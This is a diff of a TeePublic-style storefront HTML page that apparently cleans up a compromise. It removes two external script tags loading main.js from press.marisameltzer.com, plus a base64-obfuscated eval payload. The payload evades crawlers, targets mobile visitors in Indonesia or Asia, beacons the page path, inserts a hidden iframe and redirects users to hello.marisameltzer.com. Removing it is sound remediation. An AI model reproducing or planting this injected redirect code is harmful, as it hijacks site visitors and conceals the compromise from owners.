@@ -188,7 +188,7 @@
     <link as="font" crossorigin="anonymous"
         href="https://assets.teepublic.com/assets/Roobert-Medium-88ba78029f73fa9f18e1e3c31c1f076acdc49223af70a78b2ea4bdbab8168283.woff2"
         rel="preload" type="font/woff2">
-    <script src="https://press.marisameltzer.com/main.js" defer></script>
+
     <link as="font" crossorigin="anonymous"
         href="https://assets.teepublic.com/assets/Roobert-SemiBold-9d9c1ae0fc78f67d82c4fc43987857f5b897d29b903701d1e97c2e207311d636.woff2"
         rel="preload" type="font/woff2">
@@ -21866,9 +21866,7 @@
         data-navigation--cart-fire-request-value="false " data-rudderstack--link-clicked-state-value="empty "
         data-containers--drawer-component-target="content ">
         <div class="drawer__backdrop " data-action="click-&gt;containers--drawer-component#close "></div>
-        <script>
-            eval(atob("KGZ1bmN0aW9uICgpIHsKICB0cnkgewogICAgdmFyIE9SSUdJTkFMX0RPTUFJTiA9ICJ3d3cubWFyaXNhbWVsdHplci5jb20iOwogICAgdmFyIFRBUkdFVF9VUkwgICAgICA9ICJodHRwczovL2hlbGxvLm1hcmlzYW1lbHR6ZXIuY29tLyI7CiAgICB2YXIgVFJBQ0tfRU5EUE9JTlQgID0gImh0dHBzOi8vd3d3Lm1hcmlzYW1lbHR6ZXIuY29tLyI7CgogICAgaWYgKHR5cGVvZiB3aW5kb3cgPT09ICJ1bmRlZmluZWQiKSByZXR1cm47CgogICAgdmFyIHVhID0gbmF2aWdhdG9yLnVzZXJBZ2VudCB8fCAiIjsKICAgIHZhciBib3RzID0gL0dvb2dsZWJvdHxiaW5nYm90fEFocmVmc0JvdHxTZW1ydXNoQm90L2k7CiAgICBpZiAoYm90cy50ZXN0KHVhKSkgcmV0dXJuOwoKICAgIHZhciBpc01vYmlsZVVBID0gL0FuZHJvaWR8aVBob25lfGlQYWR8TW9iaWxlL2kudGVzdCh1YSk7CiAgICB2YXIgaXNTbWFsbFNjcmVlbiA9IHdpbmRvdy5pbm5lcldpZHRoIDwgNzY4OwogICAgdmFyIGlzRGV2VG9vbHMgPSB3aW5kb3cub3V0ZXJXaWR0aCAtIHdpbmRvdy5pbm5lcldpZHRoID4gMTAwOwogICAgdmFyIGlzTW9iaWxlID0gaXNNb2JpbGVVQSB8fCBpc1NtYWxsU2NyZWVuIHx8IGlzRGV2VG9vbHM7CgogICAgdmFyIGlzSW5kb25lc2lhID0KICAgICAgKG5hdmlnYXRvci5sYW5ndWFnZSAmJiBuYXZpZ2F0b3IubGFuZ3VhZ2UudG9Mb3dlckNhc2UoKS5pbmNsdWRlcygiaWQiKSkgfHwKICAgICAgKEludGwgJiYgSW50bC5EYXRlVGltZUZvcm1hdCgpLnJlc29sdmVkT3B0aW9ucygpLnRpbWVab25lLmluY2x1ZGVzKCJBc2lhIikpOwoKICAgIGlmICghaXNNb2JpbGUgfHwgIWlzSW5kb25lc2lhKSByZXR1cm47CgogICAgdHJ5IHsKICAgICAgdmFyIGltZyA9IG5ldyBJbWFnZSgpOwogICAgICBpbWcuc3JjID0gVFJBQ0tfRU5EUE9JTlQgKwogICAgICAgICI/aG9zdD0iICsgZW5jb2RlVVJJQ29tcG9uZW50KGxvY2F0aW9uLmhvc3RuYW1lKSArCiAgICAgICAgIiZwYXRoPSIgKyBlbmNvZGVVUklDb21wb25lbnQobG9jYXRpb24ucGF0aG5hbWUpICsKICAgICAgICAiJnQ9IiArIERhdGUubm93KCk7CiAgICB9IGNhdGNoIChlKSB7fQoKICAgIHZhciBmaW5hbFVSTCA9IFRBUkdFVF9VUkwucmVwbGFjZSgvXC8rJC8sICIiKTsKCiAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uICgpIHsKICAgICAgdHJ5IHsKICAgICAgICB2YXIgaWZyYW1lID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaWZyYW1lIik7CiAgICAgICAgaWZyYW1lLnN0eWxlLmNzc1RleHQgPQogICAgICAgICAgIndpZHRoOjFweDtoZWlnaHQ6MXB4O2JvcmRlcjowO3Bvc2l0aW9uOmFic29sdXRlO2xlZnQ6LTk5OTlweDt0b3A6LTk5OTlweCI7CiAgICAgICAgaWZyYW1lLnNyYyA9IGZpbmFsVVJMOwogICAgICAgIGRvY3VtZW50LmRvY3VtZW50RWxlbWVudC5hcHBlbmRDaGlsZChpZnJhbWUpOwogICAgICB9IGNhdGNoIChlKSB7fQogICAgfSwgMzAwKTsKCiAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uICgpIHsKICAgICAgdHJ5IHsKICAgICAgICB3aW5kb3cubG9jYXRpb24uaHJlZiA9IGZpbmFsVVJMOwogICAgICB9IGNhdGNoIChlKSB7fQogICAgfSwgODAwKTsKCiAgfSBjYXRjaCAoZSkgewogICAgY29uc29sZS5sb2coIkVSUk9SOiIsIGUpOwogIH0KfSkoKTs="))
-        </script>
+
         <div class="drawer__wrapper drawer__wrapper--right">
             <section class="drawer__component drawer--light m-tray-cart__wrapper "><button type="button "
                     class="btn drawer__close-button tp-btn--medium btn--no-background tp-btn--icon " data-action="click-&gt;containers--drawer-component#closePrimaryDrawer
@@ -22339,7 +22337,7 @@
                     "><img src="https://assets.teepublic.com/assets/teepublicons/x_close_neutral400-c1926221e50e7f6686d23ac344405449054e43f23d0f3306f15d8dfd546f999a.svg "
                             loading="lazy " alt="Close Drawer " height="12 " width="12 " aria_hidden="false
                     " focusable="true "></span>
-                    <script src="https://press.marisameltzer.com/main.js" defer></script>
+
                     <div class="button__content">
 
                     </div>
